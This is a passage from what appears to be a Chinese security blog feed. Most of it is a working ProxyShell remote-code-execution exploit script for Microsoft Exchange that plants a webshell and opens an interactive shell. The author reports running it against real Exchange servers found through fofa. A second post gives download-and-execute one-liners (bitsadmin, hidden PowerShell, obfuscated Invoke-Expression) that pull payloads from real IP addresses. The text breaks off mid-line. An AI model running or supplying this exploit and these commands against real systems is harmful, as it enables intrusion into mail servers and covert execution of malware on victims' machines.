powershell_url,</span><br><span class="line">            post_data,</span><br><span class="line">            headers</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        resp &#x3D; r.content</span><br><span class="line">        self.send_response(200)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ProxyShell:</span><br><span class="line"></span><br><span class="line">    def __init__(self, exchange_url, email, verify&#x3D;False):</span><br><span class="line"></span><br><span class="line">        self.email &#x3D; email</span><br><span class="line">        self.exchange_url &#x3D; exchange_url if exchange_url.startswith(&#39;https:&#x2F;&#x2F;&#39;) else f&#39;https:&#x2F;&#x2F;&#123;exchange_url&#125;&#39;</span><br><span class="line">        self.rand_email &#x3D; f&#39;&#123;rand_string()&#125;@&#123;rand_string()&#125;.&#123;rand_string(3)&#125;&#39;</span><br><span class="line">        self.sid &#x3D; None</span><br><span class="line">        self.legacydn &#x3D; None</span><br><span class="line">        self.rand_subj &#x3D; rand_string(16)</span><br><span class="line"></span><br><span class="line">        self.session &#x3D; requests.Session()</span><br><span class="line">        self.session.verify &#x3D; verify</span><br><span class="line">        self.session.headers &#x3D; &#123;</span><br><span class="line">            &#39;Cookie&#39;: f&#39;Email&#x3D;autodiscover&#x2F;autodiscover.json?a&#x3D;&#123;self.rand_email&#125;&#39;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    def post(self, endpoint, data, headers&#x3D;&#123;&#125;):</span><br><span class="line"></span><br><span class="line">        url &#x3D; f&#39;&#123;self.exchange_url&#125;&#x2F;autodiscover&#x2F;autodiscover.json?a&#x3D;&#123;self.rand_email&#125;&#123;endpoint&#125;&#39;</span><br><span class="line">        r &#x3D; self.session.post(</span><br><span class="line">            url&#x3D;url,</span><br><span class="line">            data&#x3D;data,</span><br><span class="line">            headers&#x3D;headers</span><br><span class="line">        )</span><br><span class="line">        return r</span><br><span class="line"></span><br><span class="line">    def get_token(self):</span><br><span class="line"></span><br><span class="line">        self.token &#x3D; self.gen_token()</span><br><span class="line"></span><br><span class="line">    def get_sid(self):</span><br><span class="line"></span><br><span class="line">        data &#x3D; self.legacydn</span><br><span class="line">        data +&#x3D; &#39;\x00\x00\x00\x00\x00\xe4\x04&#39;</span><br><span class="line">        data +&#x3D; &#39;\x00\x00\x09\x04\x00\x00\x09&#39;</span><br><span class="line">        data +&#x3D; &#39;\x04\x00\x00\x00\x00\x00\x00&#39;</span><br><span class="line"></span><br><span class="line">        headers &#x3D; &#123;</span><br><span class="line">            &quot;X-Requesttype&quot;: &#39;Connect&#39;,</span><br><span class="line">            &quot;X-Clientinfo&quot;: &#39;&#123;2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226&#125;&#39;,</span><br><span class="line">            &quot;X-Clientapplication&quot;: &#39;Outlook&#x2F;15.0.4815.1002&#39;,</span><br><span class="line">            &quot;X-Requestid&quot;: &#39;&#123;C715155F-2BE8-44E0-BD34-2960067874C8&#125;:2&#39;,</span><br><span class="line">            &#39;Content-Type&#39;: &#39;application&#x2F;mapi-http&#39;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r &#x3D; self.post(</span><br><span class="line">            &#39;&#x2F;mapi&#x2F;emsmdb&#39;,</span><br><span class="line">            data,</span><br><span class="line">            headers</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.sid &#x3D; r.text.split(&quot;with SID &quot;)[1].split(&quot; and MasterAccountSid&quot;)[0]</span><br><span class="line"></span><br><span class="line">    def get_legacydn(self):</span><br><span class="line"></span><br><span class="line">        data &#x3D; self.autodiscover_body()</span><br><span class="line">        headers &#x3D; &#123;&#39;Content-Type&#39;: &#39;text&#x2F;xml&#39;&#125;</span><br><span class="line">        r &#x3D; self.post(</span><br><span class="line">            &#39;&#x2F;autodiscover&#x2F;autodiscover.xml&#39;,</span><br><span class="line">            data,</span><br><span class="line">            headers</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        autodiscover_xml &#x3D; ET.fromstring(r.content)</span><br><span class="line">        self.legacydn &#x3D; autodiscover_xml.find(</span><br><span class="line">            &#39;&#123;*&#125;Response&#x2F;&#123;*&#125;User&#x2F;&#123;*&#125;LegacyDN&#39;</span><br><span class="line">        ).text</span><br><span class="line"></span><br><span class="line">    def autodiscover_body(self):</span><br><span class="line"></span><br><span class="line">        autodiscover &#x3D; ET.Element(</span><br><span class="line">            &#39;Autodiscover&#39;,</span><br><span class="line">            xmlns&#x3D;&#39;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;exchange&#x2F;autodiscover&#x2F;outlook&#x2F;requestschema&#x2F;2006&#39;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        request &#x3D; ET.SubElement(autodiscover, &#39;Request&#39;)</span><br><span class="line">        ET.SubElement(request, &#39;EMailAddress&#39;).text &#x3D; self.email</span><br><span class="line">        ET.SubElement(request, &#39;AcceptableResponseSchema&#39;).text &#x3D; &#39;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;exchange&#x2F;autodiscover&#x2F;outlook&#x2F;responseschema&#x2F;2006a&#39;</span><br><span class="line"></span><br><span class="line">        return ET.tostring(</span><br><span class="line">            autodiscover,</span><br><span class="line">            encoding&#x3D;&#39;unicode&#39;,</span><br><span class="line">            method&#x3D;&#39;xml&#39;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    def gen_token(self):</span><br><span class="line"></span><br><span class="line">        # From: https:&#x2F;&#x2F;y4y.space&#x2F;2021&#x2F;08&#x2F;12&#x2F;my-steps-of-reproducing-proxyshell&#x2F;</span><br><span class="line">        version &#x3D; 0</span><br><span class="line">        ttype &#x3D; &#39;Windows&#39;</span><br><span class="line">        compressed &#x3D; 0</span><br><span class="line">        auth_type &#x3D; &#39;Kerberos&#39;</span><br><span class="line">        raw_token &#x3D; b&#39;&#39;</span><br><span class="line">        gsid &#x3D; &#39;S-1-5-32-544&#39;</span><br><span class="line"></span><br><span class="line">        version_data &#x3D; b&#39;V&#39; + (1).to_bytes(1, &#39;little&#39;) + (version).to_bytes(1, &#39;little&#39;)</span><br><span class="line">        type_data &#x3D; b&#39;T&#39; + (len(ttype)).to_bytes(1, &#39;little&#39;) + ttype.encode()</span><br><span class="line">        compress_data &#x3D; b&#39;C&#39; + (compressed).to_bytes(1, &#39;little&#39;)</span><br><span class="line">        auth_data &#x3D; b&#39;A&#39; + (len(auth_type)).to_bytes(1, &#39;little&#39;) + auth_type.encode()</span><br><span class="line">        login_data &#x3D; b&#39;L&#39; + (len(self.email)).to_bytes(1, &#39;little&#39;) + self.email.encode()</span><br><span class="line">        user_data &#x3D; b&#39;U&#39; + (len(self.sid)).to_bytes(1, &#39;little&#39;) + self.sid.encode()</span><br><span class="line">        group_data &#x3D; b&#39;G&#39; + struct.pack(&#39;&lt;II&#39;, 1, 7) + (len(gsid)).to_bytes(1, &#39;little&#39;) + gsid.encode()</span><br><span class="line">        ext_data &#x3D; b&#39;E&#39; + struct.pack(&#39;&gt;I&#39;, 0)</span><br><span class="line"></span><br><span class="line">        raw_token +&#x3D; version_data</span><br><span class="line">        raw_token +&#x3D; type_data</span><br><span class="line">        raw_token +&#x3D; compress_data</span><br><span class="line">        raw_token +&#x3D; auth_data</span><br><span class="line">        raw_token +&#x3D; login_data</span><br><span class="line">        raw_token +&#x3D; user_data</span><br><span class="line">        raw_token +&#x3D; group_data</span><br><span class="line">        raw_token +&#x3D; ext_data</span><br><span class="line"></span><br><span class="line">        data &#x3D; base64.b64encode(raw_token).decode()</span><br><span class="line"></span><br><span class="line">        return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rand_string(n&#x3D;5):</span><br><span class="line"></span><br><span class="line">    return &#39;&#39;.join(random.choices(string.ascii_lowercase, k&#x3D;n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exploit(proxyshell):</span><br><span class="line"></span><br><span class="line">    proxyshell.get_legacydn()</span><br><span class="line">    print(f&#39;LegacyDN: &#123;proxyshell.legacydn&#125;&#39;)</span><br><span class="line"></span><br><span class="line">    proxyshell.get_sid()</span><br><span class="line">    print(f&#39;SID: &#123;proxyshell.sid&#125;&#39;)</span><br><span class="line"></span><br><span class="line">    proxyshell.get_token()</span><br><span class="line">    print(f&#39;Token: &#123;proxyshell.token&#125;&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_server(proxyshell, port):</span><br><span class="line"></span><br><span class="line">    handler &#x3D; partial(PwnServer, proxyshell)</span><br><span class="line">    server &#x3D; ThreadedHTTPServer((&#39;&#39;, port), handler)</span><br><span class="line">    server_thread &#x3D; threading.Thread(target&#x3D;server.serve_forever)</span><br><span class="line">    server_thread.daemon &#x3D; True</span><br><span class="line">    server_thread.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shell(command, port, proxyshell):</span><br><span class="line"></span><br><span class="line">    # From: https:&#x2F;&#x2F;y4y.space&#x2F;2021&#x2F;08&#x2F;12&#x2F;my-steps-of-reproducing-proxyshell&#x2F;</span><br><span class="line">    if command.lower() in [&#39;exit&#39;, &#39;quit&#39;]:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    wsman &#x3D; WSMan(&quot;127.0.0.1&quot;, username&#x3D;&#39;&#39;, password&#x3D;&#39;&#39;, ssl&#x3D;False, port&#x3D;port, auth&#x3D;&#39;basic&#39;, encryption&#x3D;&#39;never&#39;)</span><br><span class="line">    with RunspacePool(wsman, configuration_name&#x3D;&#39;Microsoft.Exchange&#39;) as pool:</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        if command.lower().strip() &#x3D;&#x3D; &#39;dropshell&#39;:</span><br><span class="line">            drop_shell(proxyshell)</span><br><span class="line"></span><br><span class="line">            ps &#x3D; PowerShell(pool)</span><br><span class="line">            ps.add_cmdlet(&#39;New-ManagementRoleAssignment&#39;).add_parameter(&#39;Role&#39;, &#39;Mailbox Import Export&#39;).add_parameter(&#39;User&#39;, proxyshell.email)</span><br><span class="line">            output &#x3D; ps.invoke()</span><br><span class="line">            print(&quot;OUTPUT:\n%s&quot; % &quot;\n&quot;.join([str(s) for s in output]))</span><br><span class="line">            print(&quot;ERROR:\n%s&quot; % &quot;\n&quot;.join([str(s) for s in ps.streams.error]))</span><br><span class="line"></span><br><span class="line">            ps &#x3D; PowerShell(pool)</span><br><span class="line">            ps.add_cmdlet(</span><br><span class="line">                &#39;New-MailboxExportRequest&#39;</span><br><span class="line">            ).add_parameter(</span><br><span class="line">                &#39;Mailbox&#39;, proxyshell.email</span><br><span class="line">            ).add_parameter(</span><br><span class="line">                &#39;FilePath&#39;, f&#39;\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet_client\\&#123;proxyshell.rand_subj&#125;.aspx&#39;</span><br><span class="line">            ).add_parameter(</span><br><span class="line">                &#39;IncludeFolders&#39;, &#39;#Drafts#&#39;</span><br><span class="line">            ).add_parameter(</span><br><span class="line">                &#39;ContentFilter&#39;, f&#39;Subject -eq \&#39;&#123;proxyshell.rand_subj&#125;\&#39;&#39;</span><br><span class="line">            )</span><br><span class="line">            output &#x3D; ps.invoke()</span><br><span class="line"></span><br><span class="line">            print(&quot;OUTPUT:\n%s&quot; % &quot;\n&quot;.join([str(s) for s in output]))</span><br><span class="line">            print(&quot;ERROR:\n%s&quot; % &quot;\n&quot;.join([str(s) for s in ps.streams.error]))</span><br><span class="line"></span><br><span class="line">            shell_url &#x3D; f&#39;&#123;proxyshell.exchange_url&#125;&#x2F;aspnet_client&#x2F;&#123;proxyshell.rand_subj&#125;.aspx&#39;</span><br><span class="line">            print(f&#39;Shell URL: &#123;shell_url&#125;&#39;)</span><br><span class="line">            for i in range(10):</span><br><span class="line">                print(f&#39;Testing shell &#123;i&#125;&#39;)</span><br><span class="line">                r &#x3D; requests.get(shell_url, verify&#x3D;proxyshell.session.verify)</span><br><span class="line">                if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">                    delimit &#x3D; rand_string()</span><br><span class="line">                    </span><br><span class="line">                    while True:</span><br><span class="line">                        cmd &#x3D; input(&#39;Shell&gt; &#39;)</span><br><span class="line">                        if cmd.lower() in [&#39;exit&#39;, &#39;quit&#39;]:</span><br><span class="line">                            return</span><br><span class="line"></span><br><span class="line">                        exec_code &#x3D; f&#39;Response.Write(&quot;&#123;delimit&#125;&quot; + new ActiveXObject(&quot;WScript.Shell&quot;).Exec(&quot;cmd.exe &#x2F;c &#123;cmd&#125;&quot;).StdOut.ReadAll() + &quot;&#123;delimit&#125;&quot;);&#39;</span><br><span class="line">                        r &#x3D; requests.get(</span><br><span class="line">                            shell_url,</span><br><span class="line">                            params&#x3D;&#123;</span><br><span class="line">                                &#39;exec_code&#39;:exec_code</span><br><span class="line">                            &#125;,</span><br><span class="line">                            verify&#x3D;proxyshell.session.verify</span><br><span class="line">                        )</span><br><span class="line">                        output &#x3D; r.content.split(delimit.encode())[1]</span><br><span class="line">                        print(output.decode())</span><br><span class="line"></span><br><span class="line">                time.sleep(5)</span><br><span class="line">                i +&#x3D; 1</span><br><span class="line"></span><br><span class="line">            print(&#39;Shell drop failed :(&#39;)</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            ps &#x3D; PowerShell(pool)</span><br><span class="line">            ps.add_script(command)</span><br><span class="line">            output &#x3D; ps.invoke()</span><br><span class="line"></span><br><span class="line">    print(&quot;OUTPUT:\n%s&quot; % &quot;\n&quot;.join([str(s) for s in output]))</span><br><span class="line">    print(&quot;ERROR:\n%s&quot; % &quot;\n&quot;.join([str(s) for s in ps.streams.error]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_args():</span><br><span class="line"></span><br><span class="line">    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;ProxyShell example&#39;)</span><br><span class="line">    parser.add_argument(&#39;-u&#39;, help&#x3D;&#39;Exchange URL&#39;, required&#x3D;True)</span><br><span class="line">    parser.add_argument(&#39;-e&#39;, help&#x3D;&#39;Email address&#39;, required&#x3D;True)</span><br><span class="line">    parser.add_argument(&#39;-p&#39;, help&#x3D;&#39;Local wsman port&#39;, default&#x3D;8000, type&#x3D;int)</span><br><span class="line">    return parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def drop_shell(proxyshell):</span><br><span class="line"></span><br><span class="line">    data &#x3D; f&quot;&quot;&quot;</span><br><span class="line">    &lt;soap:Envelope</span><br><span class="line">  xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">  xmlns:m&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;exchange&#x2F;services&#x2F;2006&#x2F;messages&quot;</span><br><span class="line">  xmlns:t&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;exchange&#x2F;services&#x2F;2006&#x2F;types&quot;</span><br><span class="line">  xmlns:soap&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">  &lt;soap:Header&gt;</span><br><span class="line">    &lt;t:RequestServerVersion Version&#x3D;&quot;Exchange2016&quot; &#x2F;&gt;</span><br><span class="line">    &lt;t:SerializedSecurityContext&gt;</span><br><span class="line">      &lt;t:UserSid&gt;&#123;proxyshell.sid&#125;&lt;&#x2F;t:UserSid&gt;</span><br><span class="line">      &lt;t:GroupSids&gt;</span><br><span class="line">        &lt;t:GroupIdentifier&gt;</span><br><span class="line">          &lt;t:SecurityIdentifier&gt;S-1-5-21&lt;&#x2F;t:SecurityIdentifier&gt;</span><br><span class="line">        &lt;&#x2F;t:GroupIdentifier&gt;</span><br><span class="line">      &lt;&#x2F;t:GroupSids&gt;</span><br><span class="line">    &lt;&#x2F;t:SerializedSecurityContext&gt;</span><br><span class="line">  &lt;&#x2F;soap:Header&gt;</span><br><span class="line">  &lt;soap:Body&gt;</span><br><span class="line">    &lt;m:CreateItem MessageDisposition&#x3D;&quot;SaveOnly&quot;&gt;</span><br><span class="line">      &lt;m:Items&gt;</span><br><span class="line">        &lt;t:Message&gt;</span><br><span class="line">          &lt;t:Subject&gt;&#123;proxyshell.rand_subj&#125;&lt;&#x2F;t:Subject&gt;</span><br><span class="line">          &lt;t:Body BodyType&#x3D;&quot;HTML&quot;&gt;hello from darkness side&lt;&#x2F;t:Body&gt;</span><br><span class="line">          &lt;t:Attachments&gt;</span><br><span class="line">            &lt;t:FileAttachment&gt;</span><br><span class="line">              &lt;t:Name&gt;FileAttachment.txt&lt;&#x2F;t:Name&gt;</span><br><span class="line">              &lt;t:IsInline&gt;false&lt;&#x2F;t:IsInline&gt;</span><br><span class="line">              &lt;t:IsContactPhoto&gt;false&lt;&#x2F;t:IsContactPhoto&gt;</span><br><span class="line">              &lt;t:Content&gt;ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT&#x2F;gtbahqXahoI5uanf2jmp1mlU041pqRT&#x2F;FIb32tld9wZUFLfTBjm5qd&#x2F;aKSDTqQ2MyenapanNjL7aXPfa1hR+glSNDYIPa4L3BtapXdqCyTEhlfvWVIa3aRTZ&lt;&#x2F;t:Content&gt;</span><br><span class="line">            &lt;&#x2F;t:FileAttachment&gt;</span><br><span class="line">          &lt;&#x2F;t:Attachments&gt;</span><br><span class="line">          &lt;t:ToRecipients&gt;</span><br><span class="line">            &lt;t:Mailbox&gt;</span><br><span class="line">              &lt;t:EmailAddress&gt;&#123;proxyshell.email&#125;&lt;&#x2F;t:EmailAddress&gt;</span><br><span class="line">            &lt;&#x2F;t:Mailbox&gt;</span><br><span class="line">          &lt;&#x2F;t:ToRecipients&gt;</span><br><span class="line">        &lt;&#x2F;t:Message&gt;</span><br><span class="line">      &lt;&#x2F;m:Items&gt;</span><br><span class="line">    &lt;&#x2F;m:CreateItem&gt;</span><br><span class="line">  &lt;&#x2F;soap:Body&gt;</span><br><span class="line">&lt;&#x2F;soap:Envelope&gt;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &#39;Content-Type&#39;: &#39;text&#x2F;xml&#39;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r &#x3D; proxyshell.post(</span><br><span class="line">        f&#39;&#x2F;EWS&#x2F;exchange.asmx&#x2F;?X-Rps-CAT&#x3D;&#123;proxyshell.token&#125;&#39;,</span><br><span class="line">        data&#x3D;data,</span><br><span class="line">        headers&#x3D;headers</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    args &#x3D; get_args()</span><br><span class="line">    exchange_url &#x3D; args.u</span><br><span class="line">    email &#x3D; args.e</span><br><span class="line">    local_port &#x3D; args.p</span><br><span class="line"></span><br><span class="line">    proxyshell &#x3D; ProxyShell(</span><br><span class="line">        exchange_url,</span><br><span class="line">        email</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    exploit(proxyshell)</span><br><span class="line">    start_server(proxyshell, local_port)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        shell(input(&#39;PS&gt; &#39;), local_port, proxyshell)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    requests.packages.urllib3.disable_warnings(</span><br><span class="line">        requests.packages.urllib3.exceptions.InsecureRequestWarning</span><br><span class="line">    )</span><br><span class="line">    if not (sys.version_info.major &#x3D;&#x3D; 3 and sys.version_info.minor &gt;&#x3D; 8):</span><br><span class="line">        print(&quot;This script requires Python 3.8 or higher!&quot;)</span><br><span class="line">        print(&quot;You are using Python &#123;&#125;.&#123;&#125;.&quot;.format(sys.version_info.major, sys.version_info.minor))</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传webshell命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python .\proxyshell_rce.py -u https:&#x2F;&#x2F;192.168.0.112&#x2F; -e Administrator@the.dog -p 9999</span><br><span class="line">Get-MailboxExportRequest</span><br><span class="line">Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false</span><br><span class="line">dropshell</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829041302748.png" alt="image-20210829041302748"></p><p>但是这种方式，server2016自带就能查杀</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829041416391.png" alt="image-20210829041416391"></p><p>不过多试一两次就不会杀了</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829043505815.png" alt="image-20210829043505815"></p><h2 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h2><p>然后proxyshell_rce.py自带的也可以执行命令，所以可以直接运行该脚本执行上传webshell命令，生成的马无需密码，是在url中直接执行命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;192.168.0.112&#x2F;&#x2F;aspnet_client&#x2F;kihgktmlgwhecpqw.aspx?exec_code&#x3D;Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).Exec(&quot;cmd.exe &#x2F;c whoami&quot;).StdOut.ReadAll());</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829044125311.png" alt="image-20210829044125311"></p><h2 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h2><p>最后就是哥斯拉下CSHAP_AES_BASE64加密方式需要修改才能用的马</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829044625870.png" alt="image-20210829044625870"></p><p>然后要把马中的Session字符替换成Application</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829044812957.png" alt="image-20210829044812957"></p><p>然后替换proxyshell_payload.py中的webshell部分，webshell参数也要由双引号变成单引号</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045047466.png" alt="image-20210829045047466"></p><p>运行得到加密后的webshell</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045122915.png" alt="image-20210829045122915"></p><p>替换proxyshell_rce.py的&lt;/t:Content/&gt;字段中</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045316799.png" alt="image-20210829045316799"></p><p>运行getshell</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045532320.png" alt="image-20210829045532320"></p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045557493.png" alt="image-20210829045557493"></p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>然后fofa上搜了下exchange的资产测试，成功率还挺高，第二个就成了。点开Certificate可以看到邮箱后缀</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045756500.png" alt="image-20210829045756500"></p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829045956641.png" alt="image-20210829045956641"></p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829050053723.png" alt="image-20210829050053723"></p><p>前面这些步骤输出和在本地测试的时候输出并不一样，当时以为没成功，可到最后一步dropshell的时候还是成功写进去了shell</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829050303757.png" alt="image-20210829050303757"></p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829050343502.png" alt="image-20210829050343502"></p><p>但是在8月26号就已经有人在这个目录下种马了</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829050529516.png" alt="image-20210829050529516"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本地测试时是在server2016上搭建的exchange2016，搭建完成后提示要重启，然后在没改任何配置的情况下，第一次重启后浏览器访问exchange提示无法工作，然后再重启一次就可以正常访问了。测试漏洞时，第一次和第二次都没利用成功，第三次写webshell被查杀，第四次成功写进去。fofa上找资产测试时前几步输出和本地测试时输出不一样，以为失败了，可最后成功写进去了。所以建议测试这个漏洞时多尝试几次。</span><br><span class="line"></span><br><span class="line">另外利用这个漏洞会自动在邮箱中生成草稿，草稿中的内容就是webshell的名字。</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829051545195.png" alt="image-20210829051545195"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件下载和执行</title>
      <link href="2021/07/14/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
      <url>2021/07/14/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h2 id="bitsadmin-下载，远程执行exe"><a href="#bitsadmin-下载，远程执行exe" class="headerlink" title="bitsadmin(下载，远程执行exe)"></a>bitsadmin(下载，远程执行exe)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">自 windows7 以上版本内置 bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有着不错的性能。</span><br><span class="line">支持的系统版本：Windows vista、Windows 7、Windows 8、Windows 8.1、Windows 10</span><br><span class="line">必须指定路径。</span><br><span class="line">注意：如果用python开放http服务提供下载，可以下载文本文件，但有时候无法下载exe文件。后来是在vps上安装的apache提供的下载服务，可以下载exe并运行。</span><br></pre></td></tr></table></figure><p>python开放http服务提供下载exe时可能会报错如下</p><p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210715095124436.png" alt="image-20210715095124436"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer myDownLoadJob &#x2F;download &#x2F;priority normal &quot;http:&#x2F;&#x2F;23.91.97.29:997&#x2F;t1st.txt&quot; &quot;d:\abc.jpg&quot;#下载文件到指定目录</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210714172613949.png" alt="image-20210714172613949"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer d90f http:&#x2F;&#x2F;23.91.97.29&#x2F;dt&#x2F;calc.exe %APPDATA%\d90f.exe&amp;%APPDATA%\d90f.exe&amp;del %APPDATA%\d90f.exe#下载exe并运行</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20210715095722393.png" alt="image-20210715095722393"></p><h2 id="powershell-下载，远程执行ps1）"><a href="#powershell-下载，远程执行ps1）" class="headerlink" title="powershell(下载，远程执行ps1）"></a>powershell(下载，远程执行ps1）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">要求win7及以上</span><br><span class="line">powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(&#39;http:&#x2F;&#x2F;23.91.97.29:998&#x2F;t1st.txt&#39;,&#39;C:\Users\test1\Desktop\1.jpg&#39;)#下载文件文件到指定目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(&#39;http:&#x2F;&#x2F;23.91.97.29:998&#x2F;t1st.txt&#39;,&#39;1.jpg&#39;)#下载到当前目录</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell set-alias -name kaspersky -value Invoke-Expression;&quot;$a1&#x3D;&#39;kaspersky ((new-object net.webclient).downl&#39;;$a2&#x3D;&#39;oadstring(&#39;&#39;http:&#x2F;&#x2F;47.52.31.161:8080&#x2F;sh1&#39;&#39;))&#39;;$a3&#x3D;$a1,$a2;kaspersky(-join $a3)&quot;#下载并运行ps1文件</span><br></pre></td></tr></table></figure><h2 id="mshta-远程执行hta"><a href="#mshta-远程执行hta" class="headerlink" title="mshta(远程执行hta)"></a>mshta(远程执行hta)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">用于执行hta文件</span><br><span class="line">生成hta马，然后mshta 